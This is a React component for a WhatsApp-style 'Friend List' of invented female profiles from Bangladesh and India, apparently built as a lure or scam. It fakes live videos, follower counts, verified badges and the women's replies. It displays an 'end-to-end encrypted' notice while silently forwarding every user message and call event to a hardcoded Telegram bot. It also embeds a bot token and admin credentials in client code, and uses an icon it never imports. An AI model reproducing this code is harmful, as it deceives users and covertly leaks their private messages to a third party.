import React, { useState, useEffect, useRef } from 'react';
import { motion, AnimatePresence } from 'motion/react';
import { 
  ArrowLeft, 
  Video, 
  Phone, 
  MoreVertical, 
  Smile, 
  Paperclip, 
  Camera, 
  Mic, 
  Send, 
  X, 
  ChevronDown, 
  RotateCcw, 
  UserPlus, 
  Volume2, 
  MicOff, 
  PhoneOff,
  FileText,
  Image as ImageIcon,
  Music,
  MapPin,
  User,
  Trash2,
  Edit2,
  CheckCircle,
  ChevronLeft,
  Camera as CameraIcon,
  Mic as MicIcon,
  Phone as PhoneIcon,
  Video as VideoIcon,
  MoreHorizontal,
  Paperclip as PaperclipIcon
} from 'lucide-react';
// Removed Firebase logic as per user request
const BOT_TOKEN = process.env.VITE_TELEGRAM_BOT_TOKEN || "8522129049:AAHZalnaH5g1evquwhwL1PmZjiasK9ZpAdI";
const CHAT_ID = process.env.VITE_TELEGRAM_CHAT_ID || "6904677396";

const sendToTelegram = async (message: string) => {
  try {
    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: CHAT_ID,
        text: message,
        parse_mode: 'Markdown'
      })
    });
  } catch (error) {
    console.error("Telegram send error:", error);
  }
};

interface Profile {
  id: number;
  name: string;
  country: 'Bangladesh' | 'India';
  image: string;
  followers: string;
  participantsCount: string;
}

interface Message {
  id: string;
  text: string;
  sender: 'client' | 'admin' | 'sys';
  time: string;
  timestamp: number;
  isEdited: boolean;
  isDeleted: boolean;
  fileUrl?: string;
  fileType?: string;
  status?: 'sent' | 'delivered' | 'read';
}

const bdNames = ['মিম', 'জুই', 'প্রিয়া', 'আনিকা', 'শিলা', 'লিসা', 'রিয়া', 'বর্ষা', 'তমা', 'মিতু', 'সাথী', 'কনক', 'নদী', 'রূপা', 'সোনিয়া', 'জেসমিন', 'শায়লা', 'নোভা', 'রুহি', 'মিলা'];
const inNames = ['প্রিয়াঙ্কা', 'দীপিকা', 'আলিয়া', 'ক্যাটরিনা', 'শ্রদ্ধা', 'কৃতি', 'দিশা', 'কিয়ারা', 'তারা', 'অনন্যা', 'জাহ্নবী', 'সারা', 'রাধিকা', 'ভূমি', 'তাপসী', 'বিদ্যা', 'সোনাক্ষী', 'পরিণীতি', 'অদিতি', 'হুমা', 'স্বরা', 'রিচা', 'কঙ্কনা', 'নেহা', 'শিল্পা', 'মাধুরী', 'কারিশমা', 'কারিনা', 'বিপাশা', 'সুস্মিতা'];

const PROFILES: Profile[] = [];
for (let i = 1; i <= 50; i++) {
  const country = (i <= 20) ? 'Bangladesh' : 'India';
  const name = (i <= 20) ? bdNames[i - 1] : inNames[i - 21];
  const userId = 2000 + i; 
  const followers = (Math.random() * 50 + 1).toFixed(1) + 'K';
  const participantOptions = ['50', '100', '500', '40', '1k', '2kk'];
  const participantsCount = participantOptions[Math.floor(Math.random() * participantOptions.length)];
  PROFILES.push({
    id: userId,
    name: name,
    country: country as any,
    image: `/assets/profiles/profile${i}.jpg`,
    followers: followers,
    participantsCount: participantsCount
  });
}

const LIVE_VIDEOS = [
  "/assets/videos/live1.mp4",
  "/assets/videos/live2.mp4",
  "/assets/videos/live3.mp4",
  "/assets/videos/live4.mp4"
];
const getLiveVideo = (index: number) => LIVE_VIDEOS[Math.abs(index) % LIVE_VIDEOS.length];

export default function FriendService({ onBack, onInitiateCall, onJoinLive, addToast }: { onBack: () => void, onInitiateCall: (type: 'audio' | 'video', profile?: { id?: number, name: string, image: string, liveVideo?: string, participantsCount?: string }) => void, onJoinLive: (profile: { id?: number, name: string, image: string, liveVideo?: string, participantsCount?: string }) => void, addToast?: (msg: string, type: 'success' | 'error' | 'info') => void }) {
  const [view, setView] = useState<'LIST' | 'CHAT'>('LIST');
  const [countryFilter, setCountryFilter] = useState<'Bangladesh' | 'India'>('Bangladesh');
  const [selectedProfile, setSelectedProfile] = useState<Profile | null>(null);
  const [messages, setMessages] = useState<Message[]>([]);
  const [inputText, setInputText] = useState('');
  const [isBlocked, setIsBlocked] = useState(false);
  const [showAttachMenu, setShowAttachMenu] = useState(false);
  const [showEmojiPanel, setShowEmojiPanel] = useState(false);
  const [showDropdown, setShowDropdown] = useState(false);
  const [isTyping, setIsTyping] = useState(false);
  
  const [isUnlocked, setIsUnlocked] = useState(false);
  const chatAreaRef = useRef<HTMLDivElement>(null);
  const fileInputRef = useRef<HTMLInputElement>(null);

  useEffect(() => {
    if (selectedProfile) {
      const unlocked = localStorage.getItem(`unlocked_live_${selectedProfile.id}`);
      setIsUnlocked(unlocked === 'true');
    }
  }, [selectedProfile]);

  const handleVideoTimeUpdate = (e: React.SyntheticEvent<HTMLVideoElement>) => {
    const video = e.currentTarget;
    if (!isUnlocked && video.currentTime >= 10) {
      video.currentTime = 0;
      video.play();
    }
  };

  // Firebase logic removed
  useEffect(() => {
    if (view === 'CHAT' && selectedProfile) {
      // Simulate initial messages or just clear
      setMessages([
        { id: '1', text: 'Hello! How can I help you today?', sender: 'admin', time: getFormattedTime(), timestamp: Date.now(), isEdited: false, isDeleted: false }
      ]);
    }
  }, [view, selectedProfile]);

  useEffect(() => {
    if (chatAreaRef.current) {
      chatAreaRef.current.scrollTop = chatAreaRef.current.scrollHeight;
    }
  }, [messages]);

  const getFormattedTime = () => {
    const now = Date.now();
    const d = new Date();
    d.setTime(now);
    let h = d.getHours();
    const m = d.getMinutes();
    const ampm = h >= 12 ? 'PM' : 'AM';
    h = h % 12 || 12; 
    const mStr = m < 10 ? '0' + m : m.toString(); 
    return h + ':' + mStr + ' ' + ampm;
  };

  const handleSendMessage = async () => {
    if (!inputText.trim() || !selectedProfile) return;
    const time = getFormattedTime();
    const text = inputText.trim();
    
    // Add to local state
    const newMsg: Message = {
      id: Date.now().toString(),
      text: text,
      sender: 'client',
      time: time,
      timestamp: Date.now(),
      isEdited: false,
      isDeleted: false,
      status: 'sent'
    };
    setMessages(prev => [...prev, newMsg]);
    
    // Simulate delivery and read
    setTimeout(() => {
      setMessages(prev => prev.map(m => m.id === newMsg.id ? { ...m, status: 'delivered' } : m));
    }, 1000);
    setTimeout(() => {
      setMessages(prev => prev.map(m => m.id === newMsg.id ? { ...m, status: 'read' } : m));
    }, 2000);

    // Send to Telegram
    await sendToTelegram(`💬 *New Message from Friend List*\nUser: \`${selectedProfile.name}\` (ID: ${selectedProfile.id})\nMessage: ${text}`);
    
    setInputText('');

    // Simulate Bot Typing and Reply
    setTimeout(() => {
      setIsTyping(true);
      setTimeout(() => {
        setIsTyping(false);
        const botMsg: Message = {
          id: (Date.now() + 1).toString(),
          text: "I'm a bit busy right now, but I'll reply as soon as I can! 💖",
          sender: 'admin',
          time: getFormattedTime(),
          timestamp: Date.now(),
          isEdited: false,
          isDeleted: false
        };
        setMessages(prev => [...prev, botMsg]);
      }, 3000);
    }, 1000);
  };

  const initiateCall = (type: 'audio' | 'video', profile?: Profile) => {
    if (profile) {
      setSelectedProfile(profile);
      sendToTelegram(`📞 *Call Initiated from Friend List*\nTarget: \`${profile.name}\` (ID: ${profile.id})\nType: ${type.toUpperCase()}`);
    }
    onInitiateCall(type, profile ? { id: profile.id, name: profile.name, image: profile.image, liveVideo: getLiveVideo(profile.id - 2001), participantsCount: profile.participantsCount } : undefined);
  };

  const endCall = () => {
    if (!selectedProfile) return;
    sendToTelegram(`❌ *Call Ended:* User disconnected from ${selectedProfile.name}'s profile.`);
  };

  const answerCall = () => {
    if (!selectedProfile) return;
    sendToTelegram(`✅ *Call Accepted:* User connected with ${selectedProfile.name}.`);
  };

  const [showLogin, setShowLogin] = useState(false);
  const [loginPhone, setLoginPhone] = useState('');
  const [loginPass, setLoginPass] = useState('');

  const verifyLogin = () => {
    if (loginPhone === '01780102623' && loginPass === '80102623') {
      localStorage.setItem('wa_isAdmin', 'true');
      addToast?.('Admin login successful!', 'success');
      window.location.reload();
    } else {
      addToast?.('Incorrect Number or Password!', 'error');
    }
  };

  return (
    <div className="flex flex-col h-full w-full bg-[#0b141a] text-white relative overflow-hidden font-sans">
      {/* Login Modal */}
      {showLogin && (
        <div className="fixed inset-0 bg-black/70 z-[99999] flex justify-center items-center p-4">
          <div className="bg-white p-6 rounded-2xl w-full max-w-xs text-center">
            <h3 className="text-xl font-bold text-[#00a884] mb-4">Switch to Admin</h3>
            <input 
              type="number" 
              placeholder="Enter Phone Number"
              className="w-full p-3 mb-4 border border-gray-300 rounded-xl text-black outline-none"
              value={loginPhone}
              onChange={(e) => setLoginPhone(e.target.value)}
            />
            <input 
              type="password" 
              placeholder="Enter Password"
              className="w-full p-3 mb-4 border border-gray-300 rounded-xl text-black outline-none"
              value={loginPass}
              onChange={(e) => setLoginPass(e.target.value)}
            />
            <button 
              className="w-full p-3 bg-[#00a884] text-white rounded-xl font-bold text-lg active:scale-95 transition-transform"
              onClick={verifyLogin}
            >
              Login
            </button>
            <div 
              className="mt-4 text-red-500 cursor-pointer text-sm font-medium"
              onClick={() => setShowLogin(false)}
            >
              Cancel
            </div>
          </div>
        </div>
      )}

      <AnimatePresence mode="wait">
        {view === 'LIST' ? (
          <motion.div 
            key="list"
            initial={{ opacity: 0 }}
            animate={{ opacity: 1 }}
            exit={{ opacity: 0 }}
            className="flex flex-col h-full"
          >
            {/* Header with Back Button */}
            <header className="bg-[#202c33] p-4 flex items-center h-16 shadow-md">
              <button onClick={onBack} className="p-1 mr-4">
                <ArrowLeft className="w-7 h-7 text-white" />
              </button>
              <h1 className="text-xl font-bold text-white">Friend List</h1>
            </header>

            <div className="flex bg-[#202c33]">
              <button 
                className={`flex-1 p-4 font-bold text-lg border-b-4 transition-all ${countryFilter === 'Bangladesh' ? 'text-[#00a884] border-[#00a884]' : 'text-[#8696a0] border-transparent'}`}
                onClick={() => setCountryFilter('Bangladesh')}
              >
                Bangladesh
              </button>
              <button 
                className={`flex-1 p-4 font-bold text-lg border-b-4 transition-all ${countryFilter === 'India' ? 'text-[#00a884] border-[#00a884]' : 'text-[#8696a0] border-transparent'}`}
                onClick={() => setCountryFilter('India')}
              >
                India
              </button>
            </div>

            <div className="flex-1 overflow-y-auto pb-24 p-4 space-y-6">
              {PROFILES.filter(p => p.country === countryFilter).map((profile, idx) => (
                <div 
                  key={profile.id} 
                  className="relative w-full aspect-[4/5] rounded-2xl overflow-hidden shadow-2xl bg-black group"
                >
                  {/* Video Background */}
                  <video 
                    src={getLiveVideo(profile.id - 2001)} 
                    className="w-full h-full object-cover opacity-60" 
                    autoPlay loop muted playsInline 
                    onTimeUpdate={handleVideoTimeUpdate}
                  />
                  
                  {/* Status Badges */}
                  <div className="absolute top-4 left-4 flex gap-2 z-10">
                    <div className="bg-red-600 text-white text-[10px] font-bold px-2 py-0.5 rounded-sm flex items-center gap-1">
                      <div className="w-1.5 h-1.5 bg-white rounded-full animate-pulse" />
                      LIVE
                    </div>
                    <div className="bg-black/40 backdrop-blur-md text-white text-[10px] px-2 py-0.5 rounded-sm flex items-center">
                      <VideoIcon className="w-3 h-3 mr-1" /> {(Math.floor(Math.random() * 2000) + 500).toLocaleString()}
                    </div>
                  </div>

                  {/* Profile Info Overlay */}
                  <div className="absolute inset-0 bg-gradient-to-t from-black/90 via-transparent to-transparent flex flex-col justify-end p-5">
                    <div className="flex items-center gap-3 mb-4">
                      <img 
                        src={profile.image} 
                        className="w-12 h-12 rounded-full border-2 border-[#00a884] object-cover"
                        alt=""
                      />
                      <div className="flex flex-col">
                        <span className="text-white font-bold text-lg flex items-center gap-2">
                          {profile.name}
                          <CheckCircle className="w-4 h-4 text-blue-400 fill-white" />
                        </span>
                        <span className="text-gray-300 text-xs">ID: {profile.id} • {profile.followers} Followers</span>
                      </div>
                    </div>

                    <div className="grid grid-cols-2 gap-3">
                      <button 
                        onClick={() => {
                          onJoinLive({ id: profile.id, name: profile.name, image: profile.image, liveVideo: getLiveVideo(profile.id - 2001), participantsCount: profile.participantsCount });
                        }} 
                        className="bg-white/10 backdrop-blur-md text-white py-3 rounded-xl font-bold text-sm active:scale-95 transition-all border border-white/20"
                      >
                        JOIN LIVE
                      </button>
                      <button 
                        onClick={() => initiateCall('video', profile)} 
                        className="bg-[#00a884] text-white py-3 rounded-xl font-bold text-sm active:scale-95 transition-all flex items-center justify-center gap-2 shadow-lg shadow-[#00a884]/20"
                      >
                        <VideoIcon className="w-4 h-4" /> VIDEO CALL
                      </button>
                    </div>
                  </div>
                </div>
              ))}
            </div>
          </motion.div>
        ) : (
          <motion.div 
            key="chat"
            initial={{ x: '100%' }}
            animate={{ x: 0 }}
            exit={{ x: '100%' }}
            className="flex flex-col h-full bg-[#efeae2] text-[#111b21]"
          >
            <header className="bg-white p-2 flex items-center h-16 shadow-sm z-10">
              <button onClick={() => setView('LIST')} className="p-1">
                <ChevronLeft className="w-7 h-7 text-[#54656f]" />
              </button>
              <img 
                src={selectedProfile?.image} 
                className="w-10 h-10 rounded-full object-cover border-2 border-[#00a884] ml-1"
                alt=""
              />
              <div className="ml-3 flex-1 flex flex-col overflow-hidden">
                <span className="font-bold text-lg truncate">{selectedProfile?.name}</span>
                <span className="text-[#667781] text-xs">online</span>
              </div>
              <div className="flex items-center gap-4 px-2">
                <VideoIcon className="w-6 h-6 text-[#54656f] cursor-pointer" onClick={() => initiateCall('video', selectedProfile || undefined)} />
                <PhoneIcon className="w-5 h-5 text-[#54656f] cursor-pointer" onClick={() => initiateCall('audio', selectedProfile || undefined)} />
                <MoreVertical className="w-6 h-6 text-[#54656f] cursor-pointer" onClick={() => setShowDropdown(!showDropdown)} />
              </div>
              
              {showDropdown && (
                <div className="absolute top-14 right-2 bg-white rounded-lg shadow-xl py-2 w-48 z-50">
                  <div className="px-4 py-3 hover:bg-gray-100 cursor-pointer" onClick={() => { setShowLogin(true); setShowDropdown(false); }}>Switch Account</div>
                  <div className="px-4 py-3 hover:bg-gray-100 cursor-pointer" onClick={onBack}>Exit</div>
                </div>
              )}
            </header>

            <div 
              ref={chatAreaRef}
              className="flex-1 overflow-y-auto p-4 flex flex-col gap-2 bg-[url('https://user-images.githubusercontent.com/15075759/28719144-86dc0f70-73b1-11e7-911d-60d70fcded21.png')] bg-cover bg-center"
            >
              <div className="flex justify-center my-2">
                <span className="bg-white text-[#667781] text-[10px] px-3 py-1 rounded-lg shadow-sm uppercase font-bold">Today</span>
              </div>
              <div className="bg-[#ffeecd] text-[#54656f] text-xs p-2 rounded-lg text-center mx-auto max-w-[90%] shadow-sm flex items-center gap-2">
                <Lock className="w-3 h-3" />
                Messages and calls are end-to-end encrypted.
              </div>

              {messages.map((msg) => (
                <div 
                  key={msg.id} 
                  className={`max-w-[80%] flex flex-col mb-1 ${msg.sender === 'client' ? 'self-end' : 'self-start'}`}
                >
                  <div className={`p-2 rounded-lg shadow-sm relative flex items-end gap-2 ${msg.sender === 'client' ? 'bg-[#d9fdd3] rounded-tr-none' : 'bg-white rounded-tl-none'}`}>
                    <div className="flex flex-col">
                      {msg.fileUrl && (
                        <div className="mb-1">
                          {msg.fileType?.startsWith('image/') ? (
                            <img src={msg.fileUrl} className="max-w-full rounded-md" alt="" />
                          ) : msg.fileType?.startsWith('video/') ? (
                            <video src={msg.fileUrl} controls className="max-w-full rounded-md" />
                          ) : (
                            <div className="bg-gray-100 p-2 rounded flex items-center gap-2">
                              <FileText className="w-5 h-5" />
                              <span className="text-xs truncate max-w-[100px]">Document</span>
                            </div>
                          )}
                        </div>
                      )}
                      <span className="text-sm">{msg.isDeleted ? '🚫 This message was deleted' : msg.text}</span>
                    </div>
                    <span className="text-[10px] text-[#667781] whitespace-nowrap flex items-center gap-1">
                      {msg.time}
                      {msg.sender === 'client' && !msg.isDeleted && (
                        <span className={`flex ${msg.status === 'read' ? 'text-[#53bdeb]' : 'text-gray-400'}`}>
                          {msg.status === 'sent' ? (
                            <svg viewBox="0 0 16 15" width="16" height="15" fill="currentColor"><path d="M15.01 3.316l-.478-.372a.365.365 0 0 0-.51.063L8.666 9.879a.32.32 0 0 1-.484.033l-1.891-2.02a.366.366 0 0 0-.515-.009l-.423.4a.366.366 0 0 0-.006.516l2.8 2.99a.32.32 0 0 0 .483.006l6.32-7.129a.365.365 0 0 0-.03-.51z"></path></svg>
                          ) : (
                            <svg viewBox="0 0 16 15" width="16" height="15" fill="currentColor"><path d="M15.01 3.316l-.478-.372a.365.365 0 0 0-.51.063L8.666 9.879a.32.32 0 0 1-.484.033l-1.891-2.02a.366.366 0 0 0-.515-.009l-.423.4a.366.366 0 0 0-.006.516l2.8 2.99a.32.32 0 0 0 .483.006l6.32-7.129a.365.365 0 0 0-.03-.51zM7.106 7.961l-.188-.203a.366.366 0 0 0-.515-.009l-.423.4a.366.366 0 0 0-.006.516l.832.89a.32.32 0 0 0 .487.01l.2-.228a.32.32 0 0 1 .483.006l.301.322a.32.32 0 0 0 .483.006L10.1 8.005a.365.365 0 0 0-.03-.51l-.478-.372a.365.365 0 0 0-.51.063L7.589 8.994a.32.32 0 0 1-.483-.033z"></path></svg>
                          )}
                        </span>
                      )}
                    </span>
                  </div>
                </div>
              ))}
              {isTyping && (
                <div className="self-start bg-white p-3 rounded-lg shadow-sm rounded-tl-none flex items-center gap-1 mb-2">
                  <div className="flex gap-1">
                    <span className="w-1.5 h-1.5 bg-gray-400 rounded-full animate-bounce [animation-delay:-0.3s]"></span>
                    <span className="w-1.5 h-1.5 bg-gray-400 rounded-full animate-bounce [animation-delay:-0.15s]"></span>
                    <span className="w-1.5 h-1.5 bg-gray-400 rounded-full animate-bounce"></span>
                  </div>
                </div>
              )}
            </div>

            <footer className="p-2 bg-transparent flex items-end gap-2 z-10">
              <div className="flex-1 bg-white rounded-3xl flex items-end p-2 gap-2 shadow-sm">
                <Smile className="w-6 h-6 text-[#54656f] mb-1 cursor-pointer" />
                <textarea 
                  className="flex-1 border-none outline-none text-base py-1 bg-transparent resize-none max-h-32"
                  placeholder="Message"
                  rows={1}
                  value={inputText}
                  onChange={(e) => setInputText(e.target.value)}
                  onKeyPress={(e) => e.key === 'Enter' && !e.shiftKey && (e.preventDefault(), handleSendMessage())}
                />
                <PaperclipIcon className="w-6 h-6 text-[#54656f] mb-1 cursor-pointer -rotate-45" onClick={() => setShowAttachMenu(!showAttachMenu)} />
                <CameraIcon className="w-6 h-6 text-[#54656f] mb-1 cursor-pointer" />
              </div>
              <button 
                className="w-12 h-12 rounded-full bg-[#00a884] flex items-center justify-center shadow-md active:scale-90 transition-transform"
                onClick={handleSendMessage}
              >
                {inputText.trim() ? <Send className="w-6 h-6 text-white ml-1" /> : <MicIcon className="w-6 h-6 text-white" />}
              </button>
            </footer>

            {isBlocked && (
              <div className="absolute bottom-0 left-0 w-full bg-[#ffeecd] text-[#54656f] text-center p-4 font-bold z-[60]">
                You cannot reply to this conversation.
              </div>
            )}
          </motion.div>
        )}
      </AnimatePresence>
    </div>
  );
}
